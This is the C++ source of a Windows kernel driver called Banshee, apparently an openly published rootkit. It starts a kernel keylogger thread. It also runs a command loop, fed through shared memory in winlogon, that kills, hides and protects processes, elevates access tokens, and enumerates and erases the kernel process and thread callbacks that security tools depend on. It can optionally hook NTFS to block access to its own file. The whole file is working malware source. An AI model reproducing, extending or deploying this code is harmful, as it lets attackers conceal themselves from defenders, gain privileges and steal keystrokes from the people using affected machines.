#include <ntifs.h>
#include <wdf.h>

#include "DriverMeta.hpp"
#include "Globals.hpp"
#include "Commands.hpp"
#include "FileUtils.hpp"
#include "Keylogger.hpp"

// --------------------------------------------------------------------------------------------------------

// Features

// Deny file system  access to the banshee.sys file by hooking NTFS
#define DENY_DRIVER_FILE_ACCESS FALSE

// --------------------------------------------------------------------------------------------------------

HANDLE hKeyloggerThread;
HANDLE hMainLoop;

typedef struct _BANSHEE_PAYLOAD {
    COMMAND_TYPE cmdType;
    ULONG status;
    ULONG ulValue;
    BYTE byteValue;
    WCHAR wcharString[64];
    CALLBACK_DATA callbackData[32];
} BANSHEE_PAYLOAD;

/**
 * Called on unloading the driver.
 *
 * @return NTSTATUS status code.
 */
NTSTATUS
BeUnload()
{
    LOG_MSG("Unload Called \r\n");

    BeGlobals::shutdown = true;
    BeGlobals::logKeys = false;

    KeWaitForSingleObject(&BeGlobals::hKeyLoggerTerminationEvent, Executive, KernelMode, FALSE, NULL);
    KeWaitForSingleObject(&BeGlobals::hMainLoopTerminationEvent, Executive, KernelMode, FALSE, NULL);
    
    // Close thread handles
    ZwClose(hKeyloggerThread);
    ZwClose(hMainLoop);

    // Restore kernel callbacks
    {
        {
            AutoLock<FastMutex> _lock(BeGlobals::callbackLock);

            LOG_MSG("Erased kernel callback amount: %i\n", BeGlobals::beCallbacksToRestore.length);
            while (BeGlobals::beCallbacksToRestore.length >= 0)
            {
                auto callbackToRestore = BeGlobals::beCallbacksToRestore.callbackToRestore[BeGlobals::beCallbacksToRestore.length];
                auto callbackAddr = BeGlobals::beCallbacksToRestore.addrOfCallbackFunction[BeGlobals::beCallbacksToRestore.length];
                auto callbackType = BeGlobals::beCallbacksToRestore.callbackType[BeGlobals::beCallbacksToRestore.length];

                if (callbackToRestore != NULL)
                {
                    LOG_MSG("Restoring kernel callback function -> callbackToRestore 0x%llx\n", callbackToRestore);
                    switch (callbackType)
                    {
                    case CreateProcessNotifyRoutine:
                    case CreateThreadNotifyRoutine:
                        InterlockedExchange64((LONG64*)callbackAddr, callbackToRestore);
                        break;
                    default:
                        LOG_MSG("Invalid callback type\r\n");
                        break;
                    }
                }
                BeGlobals::beCallbacksToRestore.length--;
            }
        }
    }

    // Unhook if NTFS was hooked
    if (BeGlobals::originalNTFS_IRP_MJ_CREATE_function != NULL)
    {
        if (BeUnhookNTFSFileCreate() == STATUS_SUCCESS)
        {
            LOG_MSG("Removed NTFS hook!\n");
        }
        else
        {
            LOG_MSG("Failed to remove NTFS hook!\n");
        }
    }

    // Delete shared memory
    BeCloseSharedMemory(BeGlobals::hSharedMemory, BeGlobals::pSharedMemory);

    // Close event handles
    BeGlobals::pZwClose(BeGlobals::commandEvent);
    BeGlobals::pZwClose(BeGlobals::answerEvent);

    // Deref objects
    ObDereferenceObject(BeGlobals::winLogonProc);

    LOG_MSG("Byebye!\n");
    PsTerminateSystemThread(STATUS_SUCCESS);
    return STATUS_SUCCESS;
}

VOID
BeMainLoop(PVOID StartContext)
{
    UNREFERENCED_PARAMETER(StartContext);

    KAPC_STATE apc;

    while (!BeGlobals::shutdown)
    {
        LOG_MSG("Waiting for commandEvent...\n");
        NTSTATUS status = BeWaitForEvent(BeGlobals::commandEvent);
        LOG_MSG("CommandEvent Signaled! %d\n", status);

        // Reset
        status = BeSetNamedEvent(BeGlobals::commandEvent, FALSE);
        LOG_MSG("CommandEvent reset! %d\n", status);

        // Read command payload
        KeStackAttachProcess(BeGlobals::winLogonProc, &apc);
        BANSHEE_PAYLOAD payload = *(BANSHEE_PAYLOAD*)BeGlobals::pSharedMemory;
        LOG_MSG("Read: %d\n", payload.cmdType);
        KeUnstackDetachProcess(&apc);

        // Execute command
        NTSTATUS bansheeStatus = STATUS_NOT_IMPLEMENTED;
        switch (payload.cmdType)
        {
        case KILL_PROCESS:
            bansheeStatus = BeCmd_KillProcess(ULongToHandle(payload.ulValue));
            break;
        case PROTECT_PROCESS:
            bansheeStatus = BeCmd_ProtectProcess(payload.ulValue, payload.byteValue);
            break;
        case ELEVATE_TOKEN:
            bansheeStatus = BeCmd_ElevateProcessAcessToken(ULongToHandle(payload.ulValue));
            break;
        case HIDE_PROCESS:
            bansheeStatus = BeCmd_HideProcess(ULongToHandle(payload.ulValue));
            break;
        case ENUM_CALLBACKS: 
            {
                auto cbData = BeCmd_EnumerateCallbacks((CALLBACK_TYPE)payload.ulValue);

                // Write answer: copy over callbacks
                KeStackAttachProcess(BeGlobals::winLogonProc, &apc);
                for (auto i = 0U; i < cbData.size(); ++i)
                {
                    memcpy((PVOID)&(*((BANSHEE_PAYLOAD*)BeGlobals::pSharedMemory)).callbackData[i], (PVOID)&cbData[i], sizeof(CALLBACK_DATA));
                }
                // Write amount of callbacks to ulValue
                (*((BANSHEE_PAYLOAD*)BeGlobals::pSharedMemory)).ulValue = (ULONG)cbData.size();
                KeUnstackDetachProcess(&apc);
            }
            bansheeStatus = STATUS_SUCCESS;
            break;
        case ERASE_CALLBACKS:
            bansheeStatus = BeCmd_EraseCallbacks(payload.wcharString, (CALLBACK_TYPE)payload.ulValue);
            break;
        case START_KEYLOGGER:
            bansheeStatus = BeCmd_StartKeylogger((BOOLEAN)payload.byteValue);
            break;
        case UNLOAD:
            BeSetNamedEvent(BeGlobals::answerEvent, TRUE);
            BeUnload();
            return;
            break;
        default:
            break;
        }

        // Write answer
        KeStackAttachProcess(BeGlobals::winLogonProc, &apc);
        (*((BANSHEE_PAYLOAD*)BeGlobals::pSharedMemory)).status = bansheeStatus;
        KeUnstackDetachProcess(&apc);

        // Set answer event
        BeSetNamedEvent(BeGlobals::answerEvent, TRUE);
        LOG_MSG("Set answerEvent\n");
    }

    KeSetEvent(&BeGlobals::hMainLoopTerminationEvent, IO_NO_INCREMENT, FALSE);
    PsTerminateSystemThread(STATUS_SUCCESS);
}

/**
 * Banshees driver entrypoint.
 *
 * @param pDriverObject Pointer to the DriverObject.
 * @param pRegistryPath A pointer to a UNICODE_STRING structure that specifies the path to the driver's Parameters key in the registry.
 * @return NTSTATUS status code.
 */
NTSTATUS
BansheeEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath)
{
    UNREFERENCED_PARAMETER(pRegistryPath);
    UNREFERENCED_PARAMETER(pDriverObject);

    NTSTATUS NtStatus = STATUS_SUCCESS;

#if DENY_DRIVER_FILE_ACCESS
    NtStatus = BeHookNTFSFileCreate();
#endif

    LOG_MSG("Init globals\r\n");
    NtStatus = BeGlobals::BeInitGlobals();
    if (!NT_SUCCESS(NtStatus))
    {
        return NtStatus;
    }

    // Start Keylogger Thread
    NtStatus = PsCreateSystemThread(&hKeyloggerThread, THREAD_ALL_ACCESS, NULL, NULL, NULL, BeKeyLoggerFunction, NULL);
    if (NtStatus != 0)
    {
        return NtStatus;
    }

    // Main command loop
    NtStatus = PsCreateSystemThread(&hMainLoop, THREAD_ALL_ACCESS, NULL, NULL, NULL, BeMainLoop, NULL);
    if (NtStatus != 0)
    {
        BeGlobals::logKeys = false;
        ZwClose(hKeyloggerThread);
        return NtStatus;
    }

    return NtStatus;
}

/**
 * Driver entrypoint.
 *
 * @param pDriverObject Pointer to the DriverObject.
 * @param pRegistryPath A pointer to a UNICODE_STRING structure that specifies the path to the driver's Parameters key in the registry.
 * @return NTSTATUS status code.
 */
extern "C"
NTSTATUS
DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath)
{
    LOG_MSG(" ______   ______   ______   ______   _    _   ______  ______ \n");
    LOG_MSG("| |  | \\ | |  | | | |  \\ \\ / |      | |  | | | |     | |     \n");
    LOG_MSG("| |--| < | |__| | | |  | | '------. | |--| | | |---- | |---- \n");
    LOG_MSG("|_|__|_/ |_|  |_| |_|  |_|  ____|_/ |_|  |_| |_|____ |_|____ \n");
    LOG_MSG(BANSHEE_VERSION);
    LOG_MSG("\n");

    // If mapped, e.g. with kdmapper, those are empty.
    UNREFERENCED_PARAMETER(pDriverObject);
    UNREFERENCED_PARAMETER(pRegistryPath);

    return BansheeEntry(pDriverObject, pRegistryPath);
}
